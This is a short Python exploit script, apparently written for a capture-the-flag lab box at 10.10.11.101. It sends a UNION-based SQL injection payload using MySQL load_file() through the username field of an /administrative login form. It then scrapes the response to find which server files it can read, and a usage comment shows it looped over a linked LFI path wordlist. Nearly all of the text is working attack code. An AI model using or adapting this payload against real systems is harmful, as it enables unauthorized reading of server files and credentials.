#!/usr/bin/env python3

import requests
import sys
import re


# uname=test&password=test  
data = {"uname":f"admin' union select 1,load_file(\"{sys.argv[1]}\"),3,4,5,6-- -","password":"admin"}
r = requests.post("http://10.10.11.101/administrative",data=data)
# Searching between 'admin' and '</h3>'
regex = re.search("admin(.*)</h3>", r.text, re.DOTALL).group(1)

if regex != "None":
    with open("found-files.txt","a") as file:
        file.write(sys.argv[1] + "\n") 
else:
    pass

# Usage: for f in $(cat list.txt); do python3 sqli.py $f; done
# LFI wordlist https://github.com/MrW0l05zyn/pentesting/blob/master/web/payloads/lfi-rfi/lfi-linux-list.txt 
